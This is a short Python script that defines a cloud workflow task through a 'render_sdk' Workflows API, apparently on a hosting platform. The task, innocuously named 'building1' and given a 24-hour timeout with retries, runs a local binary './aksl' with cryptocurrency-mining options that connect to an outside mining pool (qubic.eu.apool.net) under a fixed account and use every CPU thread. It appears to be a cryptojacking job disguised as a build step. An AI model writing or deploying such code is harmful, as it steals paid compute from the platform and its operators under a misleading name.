import sys
from render_sdk import Workflows, Retry

app = Workflows()

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def building1():
  import sys
  import os
  os.system('./aksl --algo qubic --gpu-off --xmr-1gb-pages --pool qubic.eu.apool.net:4334 --account CP_jf0ixh8hgm --worker $(echo $RANDOM | md5sum | head -c 10) --thread $(nproc --all)')

if __name__ == "__main__":
  app.start()
